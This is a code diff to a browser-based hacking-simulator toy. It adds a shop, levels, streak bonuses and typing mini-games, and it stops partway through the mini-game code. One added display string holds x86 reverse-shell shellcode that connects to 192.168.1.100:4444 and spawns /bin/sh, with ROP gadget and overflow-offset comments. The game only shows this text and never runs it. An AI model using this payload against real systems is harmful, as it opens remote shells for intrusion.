@@ -983,6 +983,403 @@
         margin: 12px 16px 16px;
       }
     }
+
+    /* ---------- Purple theme ---------- */
+    body.theme-purple {
+      --bg: #08000d;
+      --fg: #bf00ff;
+      --fg-dim: #5a007a;
+      --fg-bright: #df80ff;
+      --cursor: #bf00ff;
+      --header-bg: rgba(20, 0, 30, 0.85);
+      --glow: 0 0 8px #bf00ff, 0 0 20px #7700aa;
+    }
+
+    /* ---------- Level & Streak badges ---------- */
+    #level-badge {
+      font-size: 11px;
+      color: var(--fg-bright);
+      border: 1px solid var(--fg-dim);
+      border-radius: 4px;
+      padding: 1px 7px;
+      background: rgba(255, 255, 255, 0.05);
+      white-space: nowrap;
+      text-shadow: var(--glow);
+    }
+
+    #streak-badge {
+      font-size: 11px;
+      color: var(--fg-bright);
+      border: 1px solid var(--fg-dim);
+      border-radius: 4px;
+      padding: 1px 7px;
+      background: rgba(255, 255, 255, 0.05);
+      white-space: nowrap;
+      display: none;
+    }
+
+    #streak-badge.active {
+      display: inline-block;
+      animation: streak-glow 0.7s ease-in-out infinite alternate;
+    }
+
+    @keyframes streak-glow {
+      from { box-shadow: none; }
+      to   { box-shadow: var(--glow); }
+    }
+
+    /* ---------- Milestone banner ---------- */
+    #milestone-banner {
+      position: fixed;
+      top: 55px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-10px);
+      z-index: 260;
+      padding: 12px 30px;
+      background: rgba(0, 0, 0, 0.93);
+      border: 2px solid var(--fg);
+      border-radius: 8px;
+      color: var(--fg-bright);
+      font-size: 15px;
+      letter-spacing: 0.1em;
+      text-shadow: var(--glow);
+      text-align: center;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.35s, transform 0.35s;
+      white-space: nowrap;
+    }
+
+    #milestone-banner.visible {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    /* ---------- Header action buttons ---------- */
+    .header-action-btn {
+      background: transparent;
+      border: 1px solid var(--fg-dim);
+      color: var(--fg);
+      cursor: pointer;
+      font-size: 12px;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-family: inherit;
+      letter-spacing: 0.04em;
+      transition: background 0.2s, box-shadow 0.2s;
+      white-space: nowrap;
+    }
+
+    .header-action-btn:hover {
+      background: rgba(255, 255, 255, 0.08);
+      box-shadow: var(--glow);
+    }
+
+    /* ---------- Full-screen overlay base ---------- */
+    .fullscreen-overlay {
+      position: fixed;
+      inset: 0;
+      z-index: 400;
+      background: rgba(0, 0, 0, 0.97);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-y: auto;
+      padding: 36px 20px 50px;
+      color: var(--fg);
+    }
+
+    .fullscreen-overlay.hidden {
+      display: none;
+    }
+
+    .overlay-title {
+      font-size: 22px;
+      letter-spacing: 0.2em;
+      text-shadow: var(--glow);
+      margin-bottom: 6px;
+      color: var(--fg-bright);
+    }
+
+    .overlay-subtitle {
+      font-size: 12px;
+      color: var(--fg-dim);
+      margin-bottom: 24px;
+      letter-spacing: 0.06em;
+    }
+
+    .overlay-close {
+      position: fixed;
+      top: 18px;
+      right: 22px;
+      background: transparent;
+      border: 1px solid var(--fg-dim);
+      color: var(--fg);
+      cursor: pointer;
+      font-size: 13px;
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-family: inherit;
+      z-index: 401;
+    }
+
+    .overlay-close:hover { background: rgba(255, 255, 255, 0.07); }
+
+    /* ---------- Shop ---------- */
+    .shop-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 14px;
+      width: 100%;
+      max-width: 860px;
+    }
+
+    .shop-item {
+      border: 1px solid var(--fg-dim);
+      border-radius: 8px;
+      padding: 16px 18px;
+      background: rgba(255, 255, 255, 0.03);
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .shop-item.owned {
+      border-color: var(--fg);
+      background: rgba(0, 200, 65, 0.05);
+    }
+
+    .shop-item-icon { font-size: 26px; }
+
+    .shop-item-name {
+      font-size: 13px;
+      color: var(--fg-bright);
+      letter-spacing: 0.08em;
+      font-weight: bold;
+    }
+
+    .shop-item-desc {
+      font-size: 11px;
+      color: var(--fg-dim);
+      line-height: 1.5;
+      flex: 1;
+    }
+
+    .shop-item-cost { font-size: 12px; color: var(--fg); }
+
+    .shop-buy-btn {
+      margin-top: 6px;
+      padding: 6px 12px;
+      background: transparent;
+      border: 1px solid var(--fg);
+      color: var(--fg);
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 11px;
+      border-radius: 4px;
+      letter-spacing: 0.05em;
+      transition: background 0.2s, box-shadow 0.2s;
+    }
+
+    .shop-buy-btn:hover:not(:disabled) {
+      background: var(--fg);
+      color: var(--bg);
+      box-shadow: var(--glow);
+    }
+
+    .shop-buy-btn:disabled {
+      opacity: 0.35;
+      cursor: not-allowed;
+      border-color: var(--fg-dim);
+      color: var(--fg-dim);
+    }
+
+    /* ---------- Games ---------- */
+    .games-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+      gap: 14px;
+      width: 100%;
+      max-width: 760px;
+    }
+
+    .game-card {
+      border: 1px solid var(--fg-dim);
+      border-radius: 8px;
+      padding: 18px;
+      background: rgba(255, 255, 255, 0.03);
+      display: flex;
+      flex-direction: column;
+      gap: 7px;
+    }
+
+    .game-card-icon { font-size: 30px; }
+
+    .game-card-name {
+      font-size: 13px;
+      color: var(--fg-bright);
+      letter-spacing: 0.1em;
+      font-weight: bold;
+    }
+
+    .game-card-desc {
+      font-size: 11px;
+      color: var(--fg-dim);
+      line-height: 1.5;
+      flex: 1;
+    }
+
+    .game-card-reward { font-size: 11px; color: var(--fg); }
+
+    .game-play-btn {
+      margin-top: 6px;
+      padding: 7px 14px;
+      background: transparent;
+      border: 1px solid var(--fg);
+      color: var(--fg);
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 11px;
+      border-radius: 4px;
+      letter-spacing: 0.05em;
+      transition: background 0.2s;
+    }
+
+    .game-play-btn:hover { background: var(--fg); color: var(--bg); }
+
+    /* ---------- Game arena ---------- */
+    #game-arena {
+      width: 100%;
+      max-width: 560px;
+      margin-top: 20px;
+      border: 1px solid var(--fg-dim);
+      border-radius: 8px;
+      padding: 26px 22px;
+      background: rgba(0, 0, 0, 0.55);
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 14px;
+      text-align: center;
+    }
+
+    #game-arena.active { display: flex; }
+
+    #game-arena-title {
+      font-size: 17px;
+      letter-spacing: 0.15em;
+      color: var(--fg-bright);
+      text-shadow: var(--glow);
+    }
+
+    #game-timer-bar-wrap {
+      width: 100%;
+      height: 5px;
+      background: rgba(255, 255, 255, 0.07);
+      border: 1px solid var(--fg-dim);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+
+    #game-timer-bar {
+      height: 100%;
+      background: var(--fg);
+      box-shadow: var(--glow);
+      transition: width 0.1s linear;
+    }
+
+    #game-prompt {
+      font-size: 56px;
+      letter-spacing: 0.15em;
+      color: var(--fg-bright);
+      text-shadow: var(--glow);
+      min-height: 72px;
+      font-weight: bold;
+      font-family: 'Courier New', monospace;
+    }
+
+    #game-score-display {
+      font-size: 12px;
+      color: var(--fg-dim);
+      letter-spacing: 0.06em;
+    }
+
+    #game-input-hint {
+      font-size: 11px;
+      color: var(--fg-dim);
+      letter-spacing: 0.04em;
+    }
+
+    #game-memory-input {
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid var(--fg-dim);
+      color: var(--fg);
+      font-family: 'Courier New', monospace;
+      font-size: 22px;
+      letter-spacing: 0.25em;
+      padding: 7px 12px;
+      border-radius: 4px;
+      text-align: center;
+      width: 100%;
+      max-width: 280px;
+      outline: none;
+      text-transform: uppercase;
+    }
+
+    #game-memory-input:focus { border-color: var(--fg); }
+
+    #game-result-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      width: 100%;
+    }
+
+    #game-result-screen.visible { display: flex; }
+
+    #game-result-title {
+      font-size: 20px;
+      letter-spacing: 0.15em;
+      color: var(--fg-bright);
+      text-shadow: var(--glow);
+    }
+
+    #game-result-stats {
+      font-size: 13px;
+      color: var(--fg);
+      line-height: 1.8;
+      white-space: pre-line;
+      text-align: center;
+    }
+
+    #game-result-reward {
+      font-size: 18px;
+      color: var(--fg-bright);
+      text-shadow: var(--glow);
+    }
+
+    .game-result-btns {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .game-btn {
+      padding: 9px 20px;
+      background: transparent;
+      border: 1px solid var(--fg);
+      color: var(--fg);
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 12px;
+      border-radius: 4px;
+      letter-spacing: 0.07em;
+      transition: background 0.2s;
+    }
+
+    .game-btn:hover { background: var(--fg); color: var(--bg); }
   </style>
 </head>
 
@@ -1023,6 +1420,10 @@
         </div>
         <span id="progress-percent">0%</span>
         <span id="reward-balance">⛃ 0</span>
+        <span id="level-badge">LVL 1</span>
+        <span id="streak-badge">🔥 ×1.5</span>
+        <button class="header-action-btn" id="games-btn" title="Mini-games">🎮 GAMES</button>
+        <button class="header-action-btn" id="shop-btn" title="Shop">🛒 SHOP</button>
         <button id="settings-btn" title="Settings">⚙</button>
       </div>
     </div>
@@ -1042,6 +1443,65 @@
   </div>
 
   <div id="reward-toast" aria-live="polite"></div>
+
+  <!-- Milestone / level-up banner -->
+  <div id="milestone-banner" aria-live="polite"></div>
+
+  <!-- Games overlay -->
+  <div id="games-overlay" class="fullscreen-overlay hidden">
+    <button class="overlay-close" id="games-close">✕ Close</button>
+    <h2 class="overlay-title">🎮 MINI-GAMES</h2>
+    <p class="overlay-subtitle">Play hacking games to earn extra credits</p>
+    <div class="games-grid" id="games-list">
+      <div class="game-card">
+        <div class="game-card-icon">🔐</div>
+        <div class="game-card-name">CIPHER CRACK</div>
+        <div class="game-card-desc">A random character flashes on screen — press the matching key as fast as you can. 10 rounds, 3 seconds each.</div>
+        <div class="game-card-reward">⛃ Up to 300 credits</div>
+        <button class="game-play-btn" data-game="cipher">▶ PLAY</button>
+      </div>
+      <div class="game-card">
+        <div class="game-card-icon">🧠</div>
+        <div class="game-card-name">MEMORY BUFFER</div>
+        <div class="game-card-desc">A hex sequence is shown briefly, then hidden. Type it from memory before time runs out. 5 rounds with increasing length.</div>
+        <div class="game-card-reward">⛃ Up to 400 credits</div>
+        <button class="game-play-btn" data-game="memory">▶ PLAY</button>
+      </div>
+      <div class="game-card">
+        <div class="game-card-icon">⌨️</div>
+        <div class="game-card-name">FIREWALL RUSH</div>
+        <div class="game-card-desc">Type as many keystrokes as possible in 15 seconds to blast through a firewall layer.</div>
+        <div class="game-card-reward">⛃ Up to 500 credits</div>
+        <button class="game-play-btn" data-game="rush">▶ PLAY</button>
+      </div>
+    </div>
+    <div id="game-arena">
+      <div id="game-arena-title"></div>
+      <div id="game-timer-bar-wrap"><div id="game-timer-bar" style="width:100%"></div></div>
+      <div id="game-prompt"></div>
+      <div id="game-score-display"></div>
+      <div id="game-input-hint"></div>
+      <input id="game-memory-input" type="text" maxlength="12"
+        autocomplete="off" autocorrect="off" autocapitalize="none" spellcheck="false" />
+      <div id="game-result-screen">
+        <div id="game-result-title"></div>
+        <div id="game-result-stats"></div>
+        <div id="game-result-reward"></div>
+        <div class="game-result-btns">
+          <button class="game-btn" id="game-play-again">▶ PLAY AGAIN</button>
+          <button class="game-btn" id="game-back-to-list">← ALL GAMES</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Shop overlay -->
+  <div id="shop-overlay" class="fullscreen-overlay hidden">
+    <button class="overlay-close" id="shop-close">✕ Close</button>
+    <h2 class="overlay-title">🛒 HACK SHOP</h2>
+    <p class="overlay-subtitle" id="shop-balance-display">Balance: ⛃ 0</p>
+    <div class="shop-grid" id="shop-grid"></div>
+  </div>
 
   <!-- Settings panel -->
   <div id="settings-panel" class="hidden">
@@ -1167,7 +1627,7 @@
         <p class="how-step">6. Press <kbd>Esc</kbd> to clear the terminal and start fresh</p>
       </div>
 
-      <p id="splash-instruction">Press any key or tap to begin…</p>
+      <p id="splash-instruction">Click, tap or press any key to begin…</p>
       <div id="splash-loader">
         <div id="splash-loader-bar"></div>
       </div>
@@ -2277,6 +2737,88 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
 >> SELF-DESTRUCT SEQUENCE INITIATED........3...2...1...
 >> TRACES REMOVED.
 `,
+
+      asm: `; ── x86 Assembly — Exploit Payload ──────────────────────────────
+; Target: remote root shell via buffer overflow
+; Arch: x86 Linux, AT&T syntax
+
+.section .data
+TARGET_IP:  .asciz "192.168.1.100"
+PORT:       .word  4444
+SHELL:      .asciz "/bin//sh"
+MSG:        .asciz "[*] SHELLCODE INJECTED\n"
+
+.section .bss
+sockfd:     .space 4
+buf:        .space 1024
+
+.section .text
+.global _start
+
+_start:
+    ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+    push   $6
+    push   $1
+    push   $2
+    mov    %esp, %ecx
+    mov    $1, %ebx          ; SYS_SOCKET
+    mov    $0x66, %eax       ; sys_socketcall
+    int    $0x80
+    mov    %eax, sockfd
+
+    ; connect()
+    xor    %eax, %eax
+    push   %eax
+    push   $0xc0a80164       ; 192.168.1.100 (BE)
+    push   $0x5c11           ; port 4444 (BE)
+    push   $0x02             ; AF_INET
+    mov    %esp, %esi
+    push   $0x10             ; addrlen
+    push   %esi
+    push   sockfd
+    mov    %esp, %ecx
+    mov    $3, %ebx
+    mov    $0x66, %eax
+    int    $0x80
+
+    ; dup2(sockfd, 0/1/2) — redirect stdin/stdout/stderr
+    mov    sockfd, %ebx
+    xor    %ecx, %ecx
+dup_loop:
+    mov    $0x3f, %eax       ; sys_dup2
+    int    $0x80
+    inc    %ecx
+    cmp    $3, %ecx
+    jne    dup_loop
+
+    ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
+    xor    %eax, %eax
+    push   %eax
+    push   $0x68732f2f       ; '//sh'
+    push   $0x6e69622f       ; '/bin'
+    mov    %esp, %ebx
+    push   %eax
+    push   %ebx
+    mov    %esp, %ecx
+    xor    %edx, %edx
+    mov    $0x0b, %eax       ; sys_execve
+    int    $0x80
+
+    ; exit(0)
+exit:
+    xor    %ebx, %ebx
+    mov    $0x01, %eax
+    int    $0x80
+
+; ── ROP chain gadgets ─────────────────────────────────────────────
+; 0x08048340: pop %eax; ret
+; 0x080483a2: pop %ebx; ret
+; 0x080483b1: xor %eax,%eax; ret
+; 0x08049a60: int $0x80; ret
+; Overflow offset: 112 bytes
+; EIP overwrite at: buf+112
+; Payload size: 124 bytes
+`,
     };
 
     /* ── Settings state ───────────────────────────────────────── */
@@ -2294,6 +2836,15 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
       matrixOn: false,
       scanlinesOn: true,
       started: false,
+      // Enhanced rewards
+      level: 1,
+      lifetimeCredits: 0,
+      streak: 0,
+      streakTimer: null,
+      multiplier: 1,
+      ownedItems: new Set(),
+      glitchFreq: 0.0125,
+      autoHackInterval: null,
     };
 
     /* ── DOM refs ─────────────────────────────────────────────── */
@@ -2316,6 +2867,11 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
     const $splashLoaderBar = document.getElementById('splash-loader-bar');
     const $scanlines = document.getElementById('scanlines');
     const $matrixCanvas = document.getElementById('matrix-canvas');
+    const $levelBadge = document.getElementById('level-badge');
+    const $streakBadge = document.getElementById('streak-badge');
+    const $milestoneBanner = document.getElementById('milestone-banner');
+    const $gamesOverlay = document.getElementById('games-overlay');
+    const $shopOverlay = document.getElementById('shop-overlay');
 
     /* ── Audio (Web Audio API) ────────────────────────────────── */
     let audioCtx = null;
@@ -2453,6 +3009,9 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
 
     function updateRewards() {
       $rewardBalance.textContent = '⛃ ' + state.credits;
+      $levelBadge.textContent = 'LVL ' + state.level;
+      const balEl = document.getElementById('shop-balance-display');
+      if (balEl) balEl.textContent = 'Balance: ⛃ ' + state.credits;
     }
 
     function showRewardToast(message) {
@@ -2461,7 +3020,97 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
       clearTimeout(rewardToastTimeout);
       rewardToastTimeout = setTimeout(() => {
         $rewardToast.classList.remove('visible');
-      }, 1400);
+      }, 1600);
+    }
+
+    /* ── Levels ───────────────────────────────────────────────── */
+    const LEVEL_THRESHOLDS = [
+      0, 100, 250, 500, 900, 1400, 2100, 3000, 4200, 5800,
+      8000, 11000, 15000, 20000, 27000, 36000, 48000, 64000, 85000, 115000,
+    ];
+
+    function getLevel(lifetime) {
+      let lvl = 1;
+      for (let i = 1; i < LEVEL_THRESHOLDS.length; i++) {
+        if (lifetime >= LEVEL_THRESHOLDS[i]) lvl = i + 1;
+        else break;
+      }
+      return Math.min(lvl, LEVEL_THRESHOLDS.length);
+    }
+
+    /* ── Milestones ───────────────────────────────────────────── */
+    const MILESTONES = [
+      { threshold: 100,   bonus: 50,   label: '🎯 FIRST 100 CREDITS — BONUS +50' },
+      { threshold: 500,   bonus: 100,  label: '💎 HIGH ROLLER — BONUS +100' },
+      { threshold: 1000,  bonus: 250,  label: '🔥 CYBER MASTER — BONUS +250' },
+      { threshold: 5000,  bonus: 500,  label: '⚡ ELITE HACKER — BONUS +500' },
+      { threshold: 10000, bonus: 1000, label: '👑 LEGEND — BONUS +1000' },
+    ];
+    const _reachedMilestones = new Set();
+
+    let milestoneBannerTimeout = null;
+
+    function showMilestoneBanner(text) {
+      $milestoneBanner.textContent = text;
+      $milestoneBanner.classList.add('visible');
+      clearTimeout(milestoneBannerTimeout);
+      milestoneBannerTimeout = setTimeout(() => {
+        $milestoneBanner.classList.remove('visible');
+      }, 3400);
+    }
+
+    function checkMilestones(prevLifetime) {
+      for (const m of MILESTONES) {
+        if (!_reachedMilestones.has(m.threshold) &&
+            prevLifetime < m.threshold && state.lifetimeCredits >= m.threshold) {
+          _reachedMilestones.add(m.threshold);
+          // Add bonus only to spendable credits, not to lifetime (prevents cascade triggers)
+          state.credits += m.bonus;
+          updateRewards();
+          showMilestoneBanner(m.label);
+          return;
+        }
+      }
+    }
+
+    function checkLevelUp(prevLifetime) {
+      const newLevel = getLevel(state.lifetimeCredits);
+      if (newLevel > state.level) {
+        state.level = newLevel;
+        updateRewards();
+        showMilestoneBanner('⬆ LEVEL UP — YOU ARE NOW LEVEL ' + state.level);
+        if (state.glitchOn) triggerGlitch(400);
+      }
+    }
+
+    /* ── Streak ───────────────────────────────────────────────── */
+    const STREAK_BREAK_MS = 3000;
+
+    function getStreakMultiplier() {
+      if (state.streak >= 50) return 3;
+      if (state.streak >= 25) return 2;
+      if (state.streak >= 10) return 1.5;
+      return 1;
+    }
+
+    function updateStreakBadge() {
+      const mult = getStreakMultiplier();
+      if (state.streak >= 10) {
+        $streakBadge.textContent = '🔥 ×' + mult;
+        $streakBadge.classList.add('active');
+      } else {
+        $streakBadge.classList.remove('active');
+      }
+    }
+
+    function tickStreak() {
+      state.streak++;
+      updateStreakBadge();
+      clearTimeout(state.streakTimer);
+      state.streakTimer = setTimeout(() => {
+        state.streak = 0;
+        updateStreakBadge();
+      }, STREAK_BREAK_MS);
     }
 
     function grantReward(amount, reason, cooldownMs = 0, cooldownKey = '') {
@@ -2472,9 +3121,20 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
         state.rewardCooldowns[cooldownKey] = now;
       }
 
-      state.credits += amount;
+      const streakMult = getStreakMultiplier();
+      const totalMult = Math.round(streakMult * state.multiplier * 10) / 10;
+      const actual = Math.round(amount * totalMult);
+      const prevLifetime = state.lifetimeCredits;
+
+      state.credits += actual;
+      state.lifetimeCredits += actual;
       updateRewards();
-      showRewardToast('+' + amount + ' CREDITS — ' + reason);
+
+      const multStr = totalMult > 1 ? ' ×' + totalMult : '';
+      showRewardToast('+' + actual + ' CREDITS — ' + reason + multStr);
+
+      checkMilestones(prevLifetime);
+      checkLevelUp(prevLifetime);
       return true;
     }
 
@@ -2531,11 +3191,12 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
         grantReward(10, 'DATA EXFILTRATED');
       }
 
+      tickStreak();
       appendOutput(chunk);
       updateProgress();
 
-      // Random glitch burst (1 in 80 keystrokes)
-      if (state.glitchOn && Math.random() < 0.0125) {
+      // Random glitch burst
+      if (state.glitchOn && Math.random() < state.glitchFreq) {
         triggerGlitch(200);
       }
 
@@ -2688,18 +3349,21 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
     }
 
     document.addEventListener('keydown', e => {
-      // Don't intercept if settings panel is focused on an input
+      // Don't intercept if an input/select in settings panel is focused
       if (e.target.tagName === 'INPUT' || e.target.tagName === 'SELECT') return;
 
       ensureAudio();
 
-      // Function key shortcuts
-      if (e.key === 'F1') { e.preventDefault(); showAccess(true); return; }
-      if (e.key === 'F2') { e.preventDefault(); showAccess(false); return; }
-      if (e.key === 'F3') { e.preventDefault(); runHackSequence(); return; }
-      if (e.key === 'F4') { e.preventDefault(); triggerGlitch(600); return; }
+      // Escape — close overlays in priority order
       if (e.key === 'Escape') {
-        // Close settings or access overlay first; if neither open, clear terminal
+        if (!$gamesOverlay.classList.contains('hidden')) {
+          if (gameState.active) { stopGameTimer(); gameState.active = false; hideGameArena(); }
+          else { $gamesOverlay.classList.add('hidden'); }
+          return;
+        }
+        if (!$shopOverlay.classList.contains('hidden')) {
+          $shopOverlay.classList.add('hidden'); return;
+        }
         if (!$settingsPanel.classList.contains('hidden')) {
           $settingsPanel.classList.add('hidden');
         } else if (!$accessOverlay.classList.contains('hidden')) {
@@ -2709,6 +3373,22 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
         }
         return;
       }
+
+      // Route keypresses to the active mini-game
+      if (gameState.active && !$gamesOverlay.classList.contains('hidden')) {
+        if (!isModifierOnly(e)) { e.preventDefault(); handleGameKey(e.key); }
+        return;
+      }
+
+      // Suppress terminal typing while an overlay is open
+      if (!$gamesOverlay.classList.contains('hidden') ||
+          !$shopOverlay.classList.contains('hidden')) return;
+
+      // Function key shortcuts
+      if (e.key === 'F1') { e.preventDefault(); showAccess(true); return; }
+      if (e.key === 'F2') { e.preventDefault(); showAccess(false); return; }
+      if (e.key === 'F3') { e.preventDefault(); runHackSequence(); return; }
+      if (e.key === 'F4') { e.preventDefault(); triggerGlitch(600); return; }
       if (e.key === 'F11') return; // Let browser handle fullscreen
 
       if (isModifierOnly(e)) return;
@@ -2744,8 +3424,9 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
     }
 
     document.addEventListener('touchstart', e => {
-      // Don't interfere with settings panel controls
-      if (e.target.closest('#settings-panel') || e.target.closest('#access-overlay')) return;
+      // Don't interfere with settings panel controls or overlays
+      if (e.target.closest('#settings-panel') || e.target.closest('#access-overlay') ||
+          e.target.closest('#games-overlay') || e.target.closest('#shop-overlay')) return;
       ensureTouchInput();
       hideSplash();
       touchInput.focus();
@@ -2754,9 +3435,471 @@ mysql> SELECT * FROM user_credentials LIMIT 5;
       typeNextChars();
     }, { passive: true });
 
+    /* ── Click to start (desktop) ─────────────────────────────── */
+    // Clicking the splash screen starts the sim on desktop
+    $splash.addEventListener('click', () => {
+      ensureAudio();
+      hideSplash();
+      typeNextChars();
+    });
+
+    // Clicking anywhere on the terminal (outside overlays) types a burst
+    document.addEventListener('click', e => {
+      if (e.target.closest('#settings-panel') || e.target.closest('#access-overlay') ||
+          e.target.closest('#games-overlay') || e.target.closest('#shop-overlay') ||
+          e.target.closest('#terminal-header') || e.target.closest('#splash') ||
+          e.target.closest('#ticker-bar')) return;
+      ensureAudio();
+      hideSplash();
+      typeNextChars();
+    });
+
     /* ── Click to dismiss overlays ────────────────────────────── */
     $accessOverlay.addEventListener('click', () => {
       $accessOverlay.classList.add('hidden');
+    });
+
+    /* ── Shop ─────────────────────────────────────────────────── */
+    const SHOP_ITEMS = [
+      {
+        id: 'multiplier',
+        name: 'CREDIT MULTIPLIER',
+        icon: '💰',
+        desc: 'All future credit earnings are permanently doubled.',
+        cost: 500,
+        onBuy() { state.multiplier *= 2; showRewardToast('✓ CREDIT MULTIPLIER ACTIVE'); },
+      },
+      {
+        id: 'speed-boost',
+        name: 'SPEED BOOST',
+        icon: '⚡',
+        desc: 'Unlocks Speed 10 and Speed 15 options in Settings.',
+        cost: 200,
+        onBuy() {
+          const sb = document.getElementById('speed-btns');
+          ['10', '15'].forEach(s => {
+            if (!sb.querySelector(`[data-speed="${s}"]`)) {
+              const b = document.createElement('button');
+              b.dataset.speed = s; b.textContent = s;
+              sb.appendChild(b);
+            }
+          });
+          showRewardToast('✓ SPEED BOOST UNLOCKED');
+        },
+      },
+      {
+        id: 'auto-hack',
+        name: 'AUTO-HACK',
+        icon: '🤖',
+        desc: 'Automatically fires a burst of code every 3 seconds while active.',
+        cost: 1000,
+        onBuy() {
+          const AUTO_HACK_INTERVAL_MS = 3000;
+          if (!state.autoHackInterval) {
+            state.autoHackInterval = setInterval(() => { if (state.started) typeNextChars(); }, AUTO_HACK_INTERVAL_MS);
+          }
+          showRewardToast('✓ AUTO-HACK ENABLED');
+        },
+      },
+      {
+        id: 'theme-purple',
+        name: 'PURPLE THEME',
+        icon: '💜',
+        desc: 'Unlocks a vibrant purple/violet terminal colour theme.',
+        cost: 300,
+        onBuy() {
+          const tb = document.getElementById('theme-btns');
+          if (!tb.querySelector('[data-theme="purple"]')) {
+            const b = document.createElement('button');
+            b.dataset.theme = 'purple'; b.textContent = 'Purple';
+            tb.appendChild(b);
+          }
+          showRewardToast('✓ PURPLE THEME UNLOCKED');
+        },
+      },
+      {
+        id: 'code-asm',
+        name: 'ASSEMBLY CODE',
+        icon: '🔧',
+        desc: 'Unlocks x86 Assembly exploit payload as a code source.',
+        cost: 400,
+        onBuy() {
+          const cb = document.getElementById('code-btns');
+          if (!cb.querySelector('[data-code="asm"]')) {
+            const b = document.createElement('button');
+            b.dataset.code = 'asm'; b.textContent = 'x86 Assembly';
+            cb.appendChild(b);
+          }
+          showRewardToast('✓ ASSEMBLY CODE UNLOCKED');
+        },
+      },
+      {
+        id: 'glitch-storm',
+        name: 'GLITCH STORM',
+        icon: '🌩',
+        desc: 'Doubles the frequency of random glitch bursts.',
+        cost: 150,
+        onBuy() {
+          const GLITCH_STORM_FREQ = state.glitchFreq * 2; // double from default 0.0125
+          state.glitchFreq = GLITCH_STORM_FREQ;
+          showRewardToast('✓ GLITCH STORM ACTIVE');
+        },
+      },
+    ];
+
+    function renderShop() {
+      const grid = document.getElementById('shop-grid');
+      if (!grid) return;
+      grid.innerHTML = '';
+      SHOP_ITEMS.forEach(item => {
+        const owned = state.ownedItems.has(item.id);
+        const canAfford = state.credits >= item.cost;
+        const div = document.createElement('div');
+        div.className = 'shop-item' + (owned ? ' owned' : '');
+        div.innerHTML =
+          `<div class="shop-item-icon">${item.icon}</div>` +
+          `<div class="shop-item-name">${item.name}</div>` +
+          `<div class="shop-item-desc">${item.desc}</div>` +
+          `<div class="shop-item-cost">${owned ? '✓ OWNED' : '⛃ ' + item.cost}</div>` +
+          `<button class="shop-buy-btn" data-item-id="${item.id}"` +
+          (owned || !canAfford ? ' disabled' : '') + '>' +
+          (owned ? 'OWNED' : canAfford ? 'BUY' : 'NEED MORE CREDITS') +
+          '</button>';
+        grid.appendChild(div);
+      });
+    }
+
+    document.getElementById('shop-btn').addEventListener('click', () => {
+      renderShop();
+      document.getElementById('shop-balance-display').textContent = 'Balance: ⛃ ' + state.credits;
+      $shopOverlay.classList.remove('hidden');
+    });
+
+    document.getElementById('shop-close').addEventListener('click', () => {
+      $shopOverlay.classList.add('hidden');
+    });
+
+    $shopOverlay.addEventListener('click', e => {
+      const btn = e.target.closest('.shop-buy-btn');
+      if (!btn || btn.disabled) return;
+      const item = SHOP_ITEMS.find(i => i.id === btn.dataset.itemId);
+      if (!item || state.ownedItems.has(item.id) || state.credits < item.cost) return;
+      state.credits -= item.cost;
+      state.ownedItems.add(item.id);
+      item.onBuy();
+      updateRewards();
+      renderShop();
+    });
+
+    /* ── Mini-Games ───────────────────────────────────────────── */
+    const CIPHER_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    const CIPHER_ROUNDS = 10;
+    const CIPHER_ROUND_S = 3;
+    const CIPHER_TRANSITION_MS = 380;
+
+    const MEMORY_ROUNDS = 5;
+    const MEMORY_BASE_SEQ_LEN = 3;   // round 1 = 4 chars, round 5 = 8 chars
+    const MEMORY_DISPLAY_MS = 2200;
+    const MEMORY_INPUT_S = 7;
+    const MEMORY_NEXT_ROUND_MS = 900;
+
+    const RUSH_DURATION_S = 15;
+    const RUSH_CREDITS_PER_KEY = 3;
+    const RUSH_MAX_REWARD = 500;
+
+    const gameState = {
+      active: false,
+      currentGame: null,
+      round: 0,
+      score: 0,
+      timerInterval: null,
+      target: null,
+      rushKeys: 0,
+      memorySeq: '',
+      awaitingMemoryInput: false,
+      lastGame: null,
+      _cipherHit: null,
+      _cipherMiss: null,
+    };
+
+    const $gamesList      = document.getElementById('games-list');
+    const $gameArena      = document.getElementById('game-arena');
+    const $gameArenaTitle = document.getElementById('game-arena-title');
+    const $gameTimerBar   = document.getElementById('game-timer-bar');
+    const $gamePrompt     = document.getElementById('game-prompt');
+    const $gameScore      = document.getElementById('game-score-display');
+    const $gameHint       = document.getElementById('game-input-hint');
+    const $gameMemInput   = document.getElementById('game-memory-input');
+    const $gameResult     = document.getElementById('game-result-screen');
+    const $gameResultTitle = document.getElementById('game-result-title');
+    const $gameResultStats = document.getElementById('game-result-stats');
+    const $gameResultReward = document.getElementById('game-result-reward');
+
+    function showGameArena(title) {
+      $gamesList.style.display = 'none';
+      $gameArena.classList.add('active');
+      $gameArenaTitle.textContent = title;
+      $gameResult.classList.remove('visible');
